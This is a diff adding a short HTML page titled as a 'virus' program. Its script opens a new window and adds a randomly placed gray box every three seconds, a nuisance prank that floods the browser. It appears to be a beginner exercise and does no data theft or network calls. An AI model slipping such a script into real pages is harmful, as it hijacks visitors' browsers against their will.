@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+ 
+    <title>病毒小程序</title>
+    <script>
+        onload=function(){
+            var b = document.body;
+            setInterval(function(){
+                var div = document.createElement("div");
+                div.style.position="absolute";
+                div.style.border="1px solid red";
+                div.style.backgroundColor="gray";
+                div.style.left=Math.random()*500 + "px";
+                div.style.top=Math.random()*500 + "px";
+                div.style.zIndex=11111111;
+                div.style.width="100px";
+                div.style.height="100px";
+                window.open("7.1.html");
+                b.appendChild(div);
+            },3000);
+        }  
+    </script>
+  </head>
+<body>
+     
+  </body>
+</html>
